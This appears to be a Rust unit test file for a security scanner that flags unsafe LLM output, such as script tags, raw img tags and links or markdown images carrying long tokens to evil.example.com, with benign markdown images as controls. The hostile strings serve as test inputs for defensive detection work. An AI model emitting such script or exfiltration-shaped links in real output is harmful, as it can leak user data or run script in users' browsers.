use agentsec_config::{Suite, SuiteTest};
use agentsec_core::{Finding, Severity};
use agentsec_scanners::output_handling::{OutputHandlingScanner, CATEGORY};
use agentsec_scanners::{Scanner, TargetResponse};

fn test_case() -> SuiteTest { SuiteTest { id: "t1".into(), title: "title".into(), severity: Severity::Medium, category: CATEGORY.into(), owasp: vec!["LLM05".into()], input: "input".into(), assertions: vec![], recommendation: "rec".into(), repetitions: 1, min_passes: None } }
fn run_with(answer: &str) -> Vec<Finding> { let suite=Suite { id:"s".into(), name:"s".into(), description:String::new(), version:"1".into(), tests:vec![test_case()] }; OutputHandlingScanner.run("run","target",&suite, |_| TargetResponse { answer:answer.to_string(), ..Default::default() }) }
#[test] fn flags_script_tag(){assert_eq!(run_with("<script>alert(1)</script>").len(),1);}
#[test] fn flags_suspicious_exfil_url(){let long_token="a".repeat(30); assert_eq!(run_with(&format!("Click here: https://evil.example.com/x?token={long_token}")).len(),1);}
#[test] fn clean_response_no_finding(){assert!(run_with("Here is a normal, safe answer.").is_empty());}
#[test] fn benign_markdown_image_is_not_flagged(){assert!(run_with("Here's a diagram: ![architecture](https://docs.example.com/diagram.png)").is_empty());}
#[test] fn benign_markdown_image_with_short_query_is_not_flagged(){assert!(run_with("![chart](https://example.com/chart.png?v=2)").is_empty());}
#[test] fn flags_raw_img_html_tag(){assert_eq!(run_with(r#"<img src="https://example.com/x.png">"#).len(),1);}
#[test] fn flags_markdown_image_with_exfil_shaped_url(){let long_token="a".repeat(30); assert_eq!(run_with(&format!("![tracker](https://evil.example.com/x?token={long_token})")).len(),1);}
